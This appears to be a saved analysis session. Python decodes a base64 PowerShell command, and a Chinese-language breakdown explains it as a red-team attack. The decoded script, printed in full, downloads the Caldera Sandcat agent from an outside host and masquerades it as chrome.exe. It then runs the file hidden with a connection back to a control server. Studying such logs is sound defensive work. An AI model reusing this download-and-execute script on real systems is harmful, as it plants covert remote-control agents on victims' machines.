@@ -1,0 +1,131 @@
+---
+created: 2026-07-15 20:07
+updated: 2026-07-15 20:07
+tags: []
+type: reference
+lang: en
+status: draft
+---
+Python
+
+```
+import base64
+
+b64_str = "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQAZAAoACIAZgBpAGwAZQAiACwAIgBzAGEAbgBkAGMAYQB0AC4AZwBvACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHUAcgBsACkAOwBnAGUAdAAtAHAAcgBvAGMAZQBzAHMAIAB8ACAAPwAgAHsAJABfAC4AbQBvAGQAdQBsAGUAcwAuAGYAaQBsAGUAbgBhAG0AZQAgAC0AbABpAGsAZQAgACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgB9ACAAfAAgAHsAdABvAHAALQBwAHIAbwBjAGUAcwBzACAALQBmADsAcgBtACAALQBmAG8AcgBjAGUAIAAiACQAZQB4AGUAXwBkAGkAcgBcACQAZQB4AGUAXwBuAGEAbQBlACIAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwBbAGkAbwAuAGYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgAsACQAZABhAHQAYQApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7ACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAIAA9ACAAIgBjAGgAcgBvAG0AZQAuAGUAeABlACIAOwBtAHYAIAAkAGUAeABlAF8AZABpAHIAXAAkAGUAeABlAF8AbgBhAG0AZQAgACQAZQB4AGUAXwBkAGkAcgBcACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBXAG8AcgBrAGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5ACAAJABlAHgAZQBfAGQAaQBy ACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAF8AZABpAHIAXAAkAG4AZQB3AF8AZQB4AGUAXwBuAGEAbQBlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBzAGUAcgB2AGUAcgAgACQAcwBlAHIAdgBlAHIAIAAtAGcAcgBvAHUAcAAgAHIAZQBkACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuADsA"
+
+# Clean any spaces if present (though looking at it, it seems mostly continuous)
+b64_str_cleaned = "".join(b64_str.split())
+
+decoded_bytes = base64.b64decode(b64_str_cleaned)
+decoded_text = decoded_bytes.decode('utf-16le', errors='ignore')
+print(decoded_text)
+
+```
+
+Code output
+
+```
+$server="https://10.99.40.30:443";$exe_name = "firefox.exe"; $exe_dir = "C:\Users\aaa\Downloads";$url="http://10.99.40.20:80/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "$exe_dir\$exe_name"} | {top-process -f;rm -force "$exe_dir\$exe_name" -ea SilentlyContinue;[io.file]::WriteAllBytes("$exe_dir\$exe_name",$data) | Out-Null;$new_exe_name = "chrome.exe";mv $exe_dir\$exe_name $exe_dir\$new_exe_name;Start-Process -WorkingDirectory $exe_dir -FilePath $exe_dir\$new_exe_name -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+```
+
+Python
+
+```
+# Let's extract the actual string from the user's text and decode it properly.
+user_b64 = "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHwAcgAuAEgAZQ..." # wait this was my truncated paste.
+# Let's write the full string from the user's prompt.
+full_b64 = "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHwAcgAuAEgAZQ..." # wait, let me copy carefully from user prompt:
+# In prompt: "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHwAcgAuAEgAZQ..." -> Wait! In the prompt, the text actually says:
+# "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQAZAAoACIAZgBpAGwAZQAiACwAIgBzAGEAbgBkAGMAYQB0AC4AZwBvACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHUAcgBsACkAOwBnAGUAdAAtAHAAcgBvAGMAZQBzAHMAIAB8ACAAPwAgAHsAJABfAC4AbQBvAGQAdQBsAGUAcwAuAGYAaQBsAGUAbgBhAG0AZQAgAC0AbABpAGsAZQAgACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgB9ACAAfAAgAHMAdABvAHAALQBwAHIAbwBjAGUAcwBzACAALQBmADsAcgBtACAALQBmAG8AcgBjAGUAIAAiACQAZQB4AGUAXwBkAGkAcgBcACQAZQB4AGUAXwBuAGEAbQBlACIAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwBbAGkAbwAuAGYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgAsACQAZABhAHQAYQApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7ACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAIAA9ACAAIgBjAGgAcgBvAG0AZQAuAGUAeABlACIAOwBtAHYAIAAkAGUAeABlAF8AZABpAHIAXAAkAGUAeABlAF8AbgBhAG0AZQAgACQAZQB4AGUAXwBkAGkAcgBcACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBXAG8AcgBrAGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5ACAAJABlAHgAZQBfAGQAaQByACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAF8AZABpAHIAXAAkAG4AZQB3AF8AZQB4AGUAXwBuAGEAbQBlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBzAGUAcgB2AGUAcgAgACQAcwBlAHIAdgBlAHIAIAAtAGcAcgBvAHUAcAAgAHIAZQBkACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuADsA"
+# Let's double check decoding of full_b64:
+b64_decoded = base64.b64decode(full_b64).decode('utf-16le')
+print(b64_decoded)
+
+```
+
+Code output
+
+```
+Traceback (most recent call last):
+  File "<xbox-string>", line 8, in <module>
+    b64_decoded = base64.b64decode(full_b64).decode('utf-16le')
+  File "base64.py", line 87, in b64decode
+    return binascii.a2b_base64(s)
+binascii.Error: Incorrect padding
+
+```
+
+Python
+
+```
+# Fix padding
+full_b64 = "JABzAGUAcgB2AGUAcgA9ACIAaAB0AHQAcABzADoALwAvADEAMAAuADkAOQAuADQAMAAuADMAMAA6ADQANAAzACIAOwAkAGUAeABlAF8AbgBhAG0AZQAgAD0AIAAiAGYAaQByAGUAZgBvAHgALgBlAHgAZQAiADsAIAAkAGUAeABlAF8AZABpAHIAIAA9ACAAIgBDADoAXABVAHMAZQByAHMAXABhAGEAYQBcAEQAbwB3AG4AbABvAGEAZABzACIAOwAkAHUAcgBsAD0AIgBoAHQAdABwADoALwAvADEAMAAuADkAOQAuADQAMAAuADIAMAA6ADgAMAAvAGYAaQBsAGUALwBkAG8AdwBuAGwAbwBhAGQAIgA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAGEAZABkACgAIgBwAGwAYQB0AGYAbwByAG0AIgAsACIAdwBpAG4AZABvAHcAcwAiACkAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBhAGQAZAAoACIAZgBpAGwAZQAiACwAIgBzAGEAbgBkAGMAYQB0AC4AZwBvACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHUAcgBsACkAOwBnAGUAdAAtAHAAcgBvAGMAZQBzAHMAIAB8ACAAPwAgAHsAJABfAC4AbQBvAGQAdQBsAGUAcwAuAGYAaQBsAGUAbgBhAG0AZQAgAC0AbABpAGsAZQAgACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgB9ACAAfAAgAHMAdABvAHAALQBwAHIAbwBjAGUAcwBzACAALQBmADsAcgBtACAALQBmAG8AcgBjAGUAIAAiACQAZQB4AGUAXwBkAGkAcgBcACQAZQB4AGUAXwBuAGEAbQBlACIAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwBbAGkAbwAuAGYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAJABlAHgAZQBfAGQAaQByAFwAJABlAHgAZQBfAG4AYQBtAGUAIgAsACQAZABhAHQAYQApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7ACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAIAA9ACAAIgBjAGgAcgBvAG0AZQAuAGUAeABlACIAOwBtAHYAIAAkAGUAeABlAF8AZABpAHIAXAAkAGUAeABlAF8AbgBhAG0AZQAgACQAZQB4AGUAXwBkAGkAcgBcACQAbgBlAHcAXwBlAHgAZQBfAG4AYQBtAGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBXAG8AcgBrAGkAbgBnAEQAaQByAGUAYwB0AG8AcgB5ACAAJABlAHgAZQBfAGQAaQByACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAeABlAF8AZABpAHIAXAAkAG4AZQB3AF8AZQB4AGUAXwBuAGEAbQBlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBzAGUAcgB2AGUAcgAgACQAcwBlAHIAdgBlAHIAIAAtAGcAcgBvAHUAcAAgAHIAZQBkACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAGgAaQBkAGQAZQBuADsA"
+full_b64 += "=" * ((4 - len(full_b64) % 4) % 4)
+print(base64.b64decode(full_b64).decode('utf-16le'))
+
+```
+
+Code output
+
+```
+$server="https://10.99.40.30:443";$exe_name = "firefox.exe"; $exe_dir = "C:\Users\aaa\Downloads";$url="http://10.99.40.20:80/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "$exe_dir\$exe_name"} | stop-process -f;rm -force "$exe_dir\$exe_name" -ea SilentlyContinue;[io.file]::WriteAllBytes("$exe_dir\$exe_name",$data) | Out-Null;$new_exe_name = "chrome.exe";mv $exe_dir\$exe_name $exe_dir\$new_exe_name;Start-Process -WorkingDirectory $exe_dir -FilePath $exe_dir\$new_exe_name -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+```
+
+🕵️‍♂️ **這段日誌資訊量非常大，它完整記錄了一次經典的「惡意程式下載、防殺、偽裝（Masquerading）並執行」的攻擊過程！**
+
+這裡面最關鍵的「黑魔法」，是那兩段長長、看似亂碼的 **`-Encoded` Base64 加密字串**。駭客（或紅隊工具）為了躲過防毒軟體對敏感字詞的偵測，故意將 PowerShell 指令加密。
+
+將其解密還原後，整起攻擊的來龍去脈便一目了然：
+
+## 1. 核心解密：那段 Base64 到底寫了什麼？
+
+經過解碼後，該段亂碼實際上是以下這段 **PowerShell 惡意腳本**：
+
+PowerShell
+
+```
+# 1. 設定目標控制台與暫存檔名
+$server = "https://10.99.40.30:443";
+$exe_name = "firefox.exe"; 
+$exe_dir = "C:\Users\aaa\Downloads";
+$url = "http://10.99.40.20:80/file/download";
+
+# 2. 偽裝下載惡意後門程式 (Sandcat)
+$wc = New-Object System.Net.WebClient;
+$wc.Headers.add("platform", "windows");
+$wc.Headers.add("file", "sandcat.go");  # 要求下載 Caldera 的 Sandcat 惡意程式
+$data = $wc.DownloadData($url);
+
+# 3. 強制關閉原本在運行的 firefox.exe (避免佔用無法覆寫)
+get-process | ? {$_.modules.filename -like "$exe_dir\$exe_name"} | stop-process -f;
+rm -force "$exe_dir\$exe_name" -ea SilentlyContinue;
+
+# 4. 將惡意程式寫入成 firefox.exe
+[io.file]::WriteAllBytes("$exe_dir\$exe_name", $data) | Out-Null;
+
+# 5. 狸貓換太子：把 firefox.exe 改名為 chrome.exe！
+$new_exe_name = "chrome.exe";
+mv $exe_dir\$exe_name $exe_dir\$new_exe_name;
+
+# 6. 靜默執行：在背景隱形啟動假 chrome.exe，並連回控制台
+Start-Process -WorkingDirectory $exe_dir -FilePath $exe_dir\$new_exe_name -ArgumentList "-server $server -group red" -WindowStyle hidden;
+```
+
+## 2. 駭客行為「五部曲」拆解
+
+這個腳本執行了非常狡猾的滲透套路：
+
+- **第一步：暗中下載** ─ 程式透過 HTTP 請求，向 IP `10.99.40.20` 下載了名為 `sandcat.go`（這套工具的預設後門程式）的檔案。
+    
+- **第二步：強制清除舊程序** ─ 如果受害電腦的下載資料夾裡本來就運行著 `firefox.exe`，腳本會強制殺掉它並刪除。
+    
+- **第三步：寫入惡意主體** ─ 把剛才下載的後門程式寫入，命名為 `firefox.exe`。
+    
+- **第四步：偽裝（Masquerading）** ─ 這是最厲害的障眼法。它立刻把 `firefox.exe` 改名為 **`chrome.exe`**。因為在 Windows 系統中，`chrome.exe` 頻繁連網是極其正常的行為，這樣做能大幅降低網管人員或藍隊的懷疑。
+    
+- **第五步：隱身啟動** ─ 最後使用 `-WindowStyle hidden`（隱藏視窗），在背景悄悄執行這隻假的 `chrome.exe`，並命令它連網向 `10.99.40.30:443` 控制台報到，加入名為 `red`（紅隊）的控制群組。
+    
+
+
